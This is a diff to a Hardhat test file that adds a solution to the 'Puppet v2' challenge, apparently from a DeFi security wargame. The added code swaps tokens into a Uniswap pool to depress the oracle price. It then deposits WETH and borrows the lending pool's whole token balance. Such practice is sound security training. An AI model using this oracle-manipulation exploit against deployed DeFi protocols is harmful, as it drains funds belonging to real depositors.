@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const helpers = require("@nomicfoundation/hardhat-network-helpers");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
@@ -81,8 +82,21 @@ describe('[Challenge] Puppet v2', function () {
         ).to.eq(300000n * 10n ** 18n);
     });
 
-    it('Execution', async function () {
+    it('Execution Puppet2', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            9n * 10n ** 18n,
+            [token.address, weth.address],
+            player.address,
+            await helpers.time.latest() + 1
+        )
+        let ethReceived = await ethers.provider.getBalance(player.address)
+        let amountToDepositToDrainPool = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        await weth.connect(player).deposit({ value: amountToDepositToDrainPool })
+        await weth.connect(player).approve(lendingPool.address, amountToDepositToDrainPool)
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE)
     });
 
     after(async function () {
